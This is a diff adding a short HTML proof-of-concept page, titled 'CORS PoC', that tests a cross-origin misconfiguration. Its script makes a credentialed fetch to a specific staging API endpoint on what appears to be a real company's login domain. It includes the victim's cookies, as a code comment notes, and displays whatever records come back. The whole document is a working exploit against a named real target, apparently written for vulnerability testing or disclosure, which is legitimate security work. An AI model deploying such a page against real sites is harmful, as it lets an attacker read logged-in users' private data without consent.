@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS PoC</h2>
+<pre id="output">Waiting...</pre>
+
+<script>
+fetch("https://login.streamline.staging.ehc.adp.com/DataHubConfiguration/api/connectors/ec/11620/targetrecords", {
+  method: "GET",
+  credentials: "include"   // <-- sends victim's cookies automatically
+})
+.then(response => {
+  document.getElementById("output").innerText = 
+    "STATUS: " + response.status;
+  return response.text();
+})
+.then(data => {
+  document.getElementById("output").innerText += "\n\nDATA:\n" + data;
+})
+.catch(err => {
+  document.getElementById("output").innerText = "BLOCKED: " + err;
+});
+</script>
+</body>
+</html>
